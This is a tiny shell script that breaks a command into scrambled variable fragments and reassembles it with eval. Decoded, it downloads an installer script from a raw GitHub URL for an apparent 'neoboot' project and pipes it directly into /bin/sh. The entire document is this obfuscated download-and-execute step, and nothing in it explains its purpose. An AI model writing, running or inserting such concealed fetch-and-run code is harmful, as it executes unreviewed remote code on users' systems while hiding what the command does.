z="
";Qz='/ins';Ez='.git';Jz='om/e';Kz='mil2';Nz='ot_9';Wz='n/sh';Hz='onte';Bz=' htt';Oz='.54/';Cz='ps:/';Mz='eobo';Vz=' /bi';Uz=' - |';Lz='37/n';Az='wget';Rz='tall';Iz='nt.c';Fz='hubu';Pz='main';Tz='h -O';Dz='/raw';Sz='er.s';Gz='serc';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"